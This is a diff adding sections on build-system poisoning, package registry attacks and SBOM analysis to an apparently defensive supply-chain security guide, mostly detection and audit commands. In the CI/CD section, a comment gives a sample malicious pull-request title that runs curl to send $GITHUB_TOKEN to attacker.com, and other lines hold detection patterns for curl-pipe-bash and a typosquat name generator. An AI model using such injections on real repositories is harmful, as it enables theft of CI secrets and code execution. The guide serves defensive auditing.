@@ -611,3 +611,349 @@ diff -r package/ /tmp/source/ --brief
 # Use OpenSSF Scorecard to evaluate package security
 # https://securityscorecards.dev/view/?uri=github.com/owner/repo
 ```
+
+---
+
+## 9. Build System Poisoning
+
+### CI/CD Pipeline Injection
+
+```bash
+# Detect injectable workflow triggers in GitHub Actions
+# pull_request_target runs in the context of the base branch with write access
+grep -rn "pull_request_target" .github/workflows/ -A 10 | grep -E "run:|uses:"
+
+# Test for expression injection via PR metadata
+# If workflow uses: run: echo "${{ github.event.pull_request.title }}"
+# Attacker PR title: $(curl https://attacker.com/exfil?token=$GITHUB_TOKEN)
+
+# Detect unsafe checkout of PR code in privileged context
+grep -rn "pull_request_target" .github/workflows/ -A 20 | grep "actions/checkout" -A 3 | grep "ref:"
+# If ref: ${{ github.event.pull_request.head.sha }} -> code execution in privileged context
+
+# Enumerate GitHub Actions secrets accessible to workflows
+gh api repos/:owner/:repo/actions/secrets --jq '.secrets[].name'
+gh api repos/:owner/:repo/actions/organization-secrets --jq '.secrets[].name'
+```
+
+### Artifact Tampering and Cache Poisoning
+
+```bash
+# GitHub Actions cache poisoning
+# If cache key is predictable, attacker can poison shared caches
+# Check cache keys in workflows
+grep -rn "actions/cache" .github/workflows/ -A 5 | grep "key:"
+
+# Test if build artifacts can be replaced between jobs
+# Download artifact from a workflow run
+gh run download ${RUN_ID} -n artifact-name
+
+# Verify artifact integrity (if signatures exist)
+cosign verify-blob --signature artifact.sig --key cosign.pub artifact.tar.gz
+
+# Check for unsigned artifacts in release pipeline
+gh release view ${TAG} --json assets --jq '.assets[] | {name, url}'
+# Download and verify each asset has corresponding .sig or .sha256 file
+
+# Detect mutable tags in container registries (tag can be overwritten)
+skopeo inspect docker://registry.io/image:latest --raw | jq '.config.digest'
+# Compare digest over time - if it changes, tag is mutable (supply chain risk)
+```
+
+### Build Environment Compromise Detection
+
+```bash
+# Verify build reproducibility (detect tampering)
+# Build twice and compare outputs
+docker build -t app:build1 . && docker save app:build1 > build1.tar
+docker build -t app:build2 --no-cache . && docker save app:build2 > build2.tar
+
+# Compare layer digests
+sha256sum build1.tar build2.tar
+# If different -> non-reproducible build (harder to detect tampering)
+
+# Check for unexpected network access during build
+# Run build with network monitoring
+strace -f -e trace=network docker build . 2>&1 | grep "connect(" | \
+  grep -v "127.0.0.1\|::1" | sort -u
+
+# Verify builder image integrity
+docker inspect --format='{{.RepoDigests}}' node:18-slim
+# Pin to digest in Dockerfile: FROM node:18-slim@sha256:abc123...
+```
+
+### Makefile and Build Script Injection
+
+```bash
+# Scan for dangerous patterns in build scripts
+# Makefile command injection via environment variables
+grep -rn '$(shell' Makefile
+grep -rn '`' Makefile | grep -v "^#"
+
+# Check for curl-pipe-bash patterns in build scripts
+grep -rn "curl.*|.*sh\|curl.*|.*bash\|wget.*|.*sh" Makefile scripts/ .github/ 2>/dev/null
+
+# Detect post-install hooks that download external code
+find . -name "package.json" -exec jq -r '.scripts | to_entries[] | select(.value | test("curl|wget|fetch|http")) | "\(.key): \(.value)"' {} \;
+
+# Check for build-time secret exposure
+grep -rn "ARG\|ENV" Dockerfile | grep -iE "secret|token|password|key"
+# Secrets in ARG/ENV persist in image layers
+docker history --no-trunc target-image:latest | grep -iE "secret|token|key"
+```
+
+---
+
+## 10. Package Registry Attacks
+
+### Typosquatting Detection and Prevention
+
+```bash
+# Generate typosquat candidates for a package name
+python3 -c "
+import itertools
+
+def generate_typosquats(package_name):
+    candidates = set()
+    # Character substitution
+    subs = {'a':'@','e':'3','i':'1','o':'0','l':'1','s':'5','t':'7'}
+    for i, c in enumerate(package_name):
+        if c in subs:
+            candidates.add(package_name[:i] + subs[c] + package_name[i+1:])
+    # Character omission
+    for i in range(len(package_name)):
+        candidates.add(package_name[:i] + package_name[i+1:])
+    # Character duplication
+    for i in range(len(package_name)):
+        candidates.add(package_name[:i] + package_name[i] + package_name[i:])
+    # Adjacent transposition
+    for i in range(len(package_name)-1):
+        candidates.add(package_name[:i] + package_name[i+1] + package_name[i] + package_name[i+2:])
+    # Hyphen/underscore confusion
+    candidates.add(package_name.replace('-', '_'))
+    candidates.add(package_name.replace('_', '-'))
+    candidates.discard(package_name)
+    return sorted(candidates)
+
+pkg = 'express-validator'
+typos = generate_typosquats(pkg)
+print(f'Generated {len(typos)} typosquat candidates for \"{pkg}\":')
+for t in typos[:20]:
+    print(f'  {t}')
+"
+```
+
+### Namespace Confusion Attack Detection
+
+```bash
+# Check for namespace/scope confusion between registries
+# npm: @scope/package vs package (unscoped)
+INTERNAL_PACKAGES=$(cat package.json | jq -r '.dependencies + .devDependencies | keys[]' | grep "^@company")
+
+for pkg in $INTERNAL_PACKAGES; do
+  # Strip scope and check if unscoped version exists publicly
+  unscoped=$(echo "$pkg" | sed 's/@[^/]*\///')
+  public_check=$(npm view "$unscoped" 2>&1)
+  if ! echo "$public_check" | grep -q "404"; then
+    echo "[ALERT] Namespace confusion risk: $pkg vs public $unscoped"
+    echo "  Public package info: $(npm view "$unscoped" --json | jq '{version, maintainers}')"
+  fi
+done
+
+# Python namespace confusion (flat namespace)
+pip3 index versions internal-package-name 2>&1 | head -5
+
+# Check if internal Go modules could be confused with public ones
+grep -r "require" go.mod | grep -v "github.com\|golang.org" | \
+  while read line; do
+    mod=$(echo "$line" | awk '{print $2}')
+    echo "[CHECK] Private module: $mod"
+    go list -m -json "$mod" 2>&1 | head -5
+  done
+```
+
+### Dependency Hijacking via Maintainer Takeover
+
+```bash
+# Identify packages with single maintainer (higher hijack risk)
+cat package-lock.json | jq -r '.packages | to_entries[] | .key' | \
+  grep "node_modules/" | sed 's|node_modules/||' | head -50 | while read pkg; do
+    maintainers=$(npm view "$pkg" maintainers --json 2>/dev/null | jq 'length')
+    if [ "$maintainers" = "1" ]; then
+      echo "[RISK] Single maintainer: $pkg"
+      npm view "$pkg" maintainers --json | jq '.[0]'
+    fi
+  done
+
+# Check for recently transferred packages (ownership change)
+npm view suspicious-package --json | jq '{
+  name: .name,
+  current_maintainers: .maintainers,
+  publish_times: .time | to_entries | sort_by(.value) | reverse | .[0:5]
+}'
+
+# Detect abandoned packages (no updates in 2+ years)
+cat package-lock.json | jq -r '.packages | to_entries[] | .key' | \
+  grep "node_modules/" | sed 's|node_modules/||' | while read pkg; do
+    last_publish=$(npm view "$pkg" time --json 2>/dev/null | jq -r 'to_entries | sort_by(.value) | reverse | .[0].value')
+    if [ -n "$last_publish" ]; then
+      days_ago=$(( ($(date +%s) - $(date -d "$last_publish" +%s 2>/dev/null || echo 0)) / 86400 ))
+      [ "$days_ago" -gt 730 ] && echo "[ABANDONED] $pkg (last publish: $last_publish, ${days_ago}d ago)"
+    fi
+  done
+```
+
+---
+
+## 11. SBOM Analysis Automation
+
+### CycloneDX Parsing and Vulnerability Correlation
+
+```python
+#!/usr/bin/env python3
+"""Parse CycloneDX SBOM and correlate with vulnerability databases."""
+import json
+import sys
+from pathlib import Path
+
+def parse_cyclonedx(sbom_path):
+    with open(sbom_path) as f:
+        sbom = json.load(f)
+
+    components = sbom.get("components", [])
+    results = {
+        "total_components": len(components),
+        "by_type": {},
+        "by_license": {},
+        "high_risk": []
+    }
+
+    for comp in components:
+        comp_type = comp.get("type", "unknown")
+        results["by_type"][comp_type] = results["by_type"].get(comp_type, 0) + 1
+
+        # Check for risky licenses
+        for lic in comp.get("licenses", []):
+            lic_id = lic.get("license", {}).get("id", "unknown")
+            results["by_license"][lic_id] = results["by_license"].get(lic_id, 0) + 1
+
+        # Flag components without integrity hashes
+        if not comp.get("hashes"):
+            results["high_risk"].append({
+                "name": comp.get("name"),
+                "version": comp.get("version"),
+                "reason": "no integrity hash"
+            })
+
+    return results
+
+if __name__ == "__main__":
+    sbom_file = sys.argv[1] if len(sys.argv) > 1 else "sbom.json"
+    analysis = parse_cyclonedx(sbom_file)
+    print(json.dumps(analysis, indent=2))
+```
+
+### SBOM Diff Between Releases
+
+```bash
+# Compare SBOMs between two releases to detect unexpected changes
+# Generate SBOMs for both versions
+syft ./release-v1.0/ -o cyclonedx-json > sbom_v1.json
+syft ./release-v2.0/ -o cyclonedx-json > sbom_v2.json
+
+# Extract component lists and diff
+jq -r '.components[] | "\(.name)@\(.version)"' sbom_v1.json | sort > components_v1.txt
+jq -r '.components[] | "\(.name)@\(.version)"' sbom_v2.json | sort > components_v2.txt
+
+echo "=== NEW DEPENDENCIES ==="
+comm -13 components_v1.txt components_v2.txt
+
+echo "=== REMOVED DEPENDENCIES ==="
+comm -23 components_v1.txt components_v2.txt
+
+echo "=== VERSION CHANGES ==="
+comm -12 <(cut -d@ -f1 components_v1.txt | sort) <(cut -d@ -f1 components_v2.txt | sort) | while read pkg; do
+  v1=$(grep "^${pkg}@" components_v1.txt | cut -d@ -f2)
+  v2=$(grep "^${pkg}@" components_v2.txt | cut -d@ -f2)
+  [ "$v1" != "$v2" ] && echo "  $pkg: $v1 -> $v2"
+done
+```
+
+### Automated Vulnerability Correlation Pipeline
+
+```bash
+# End-to-end SBOM generation, scanning, and reporting pipeline
+#!/bin/bash
+set -euo pipefail
+
+PROJECT_DIR="${1:-.}"
+REPORT_DIR="./security-reports/$(date +%Y%m%d)"
+mkdir -p "$REPORT_DIR"
+
+echo "[1/5] Generating SBOM..."
+syft "$PROJECT_DIR" -o cyclonedx-json > "$REPORT_DIR/sbom.json"
+
+echo "[2/5] Scanning for vulnerabilities..."
+grype sbom:"$REPORT_DIR/sbom.json" -o json > "$REPORT_DIR/vulns.json"
+
+echo "[3/5] Checking for known malicious packages..."
+jq -r '.components[].name' "$REPORT_DIR/sbom.json" | while read pkg; do
+  osv-scanner scan --lockfile=/dev/null --sbom="$REPORT_DIR/sbom.json" 2>/dev/null
+done > "$REPORT_DIR/osv_results.txt" 2>&1 || true
+
+echo "[4/5] Generating summary..."
+TOTAL=$(jq '.components | length' "$REPORT_DIR/sbom.json")
+CRITICAL=$(jq '[.matches[] | select(.vulnerability.severity == "Critical")] | length' "$REPORT_DIR/vulns.json")
+HIGH=$(jq '[.matches[] | select(.vulnerability.severity == "High")] | length' "$REPORT_DIR/vulns.json")
+
+echo "[5/5] Report complete."
+echo "  Components: $TOTAL"
+echo "  Critical vulns: $CRITICAL"
+echo "  High vulns: $HIGH"
+echo "  Full report: $REPORT_DIR/"
+
+# Generate actionable remediation list
+jq -r '.matches[] | select(.vulnerability.severity == "Critical" or .vulnerability.severity == "High") | "\(.vulnerability.id) | \(.artifact.name)@\(.artifact.version) | \(.vulnerability.severity) | \(.vulnerability.fix.versions[0] // "no fix")"' \
+  "$REPORT_DIR/vulns.json" | sort -t'|' -k3 | \
+  column -t -s'|' > "$REPORT_DIR/remediation.txt"
+echo "  Remediation plan: $REPORT_DIR/remediation.txt"
+```
+
+### License Compliance Analysis from SBOM
+
+```bash
+# Extract and analyze license compliance from SBOM
+python3 -c "
+import json
+import sys
+
+COPYLEFT_LICENSES = {'GPL-2.0', 'GPL-3.0', 'AGPL-3.0', 'LGPL-2.1', 'LGPL-3.0', 'MPL-2.0'}
+PERMISSIVE_LICENSES = {'MIT', 'Apache-2.0', 'BSD-2-Clause', 'BSD-3-Clause', 'ISC', 'Unlicense'}
+
+with open('sbom.json') as f:
+    sbom = json.load(f)
+
+issues = []
+stats = {'copyleft': 0, 'permissive': 0, 'unknown': 0}
+
+for comp in sbom.get('components', []):
+    licenses = []
+    for lic in comp.get('licenses', []):
+        lic_id = lic.get('license', {}).get('id', 'UNKNOWN')
+        licenses.append(lic_id)
+        if lic_id in COPYLEFT_LICENSES:
+            stats['copyleft'] += 1
+            issues.append(f\"[COPYLEFT] {comp['name']}@{comp.get('version','?')}: {lic_id}\")
+        elif lic_id in PERMISSIVE_LICENSES:
+            stats['permissive'] += 1
+        else:
+            stats['unknown'] += 1
+    if not licenses:
+        issues.append(f\"[NO LICENSE] {comp['name']}@{comp.get('version','?')}\")
+
+print(f'License Summary: {json.dumps(stats)}')
+print(f'Issues found: {len(issues)}')
+for issue in issues:
+    print(f'  {issue}')
+"
+```
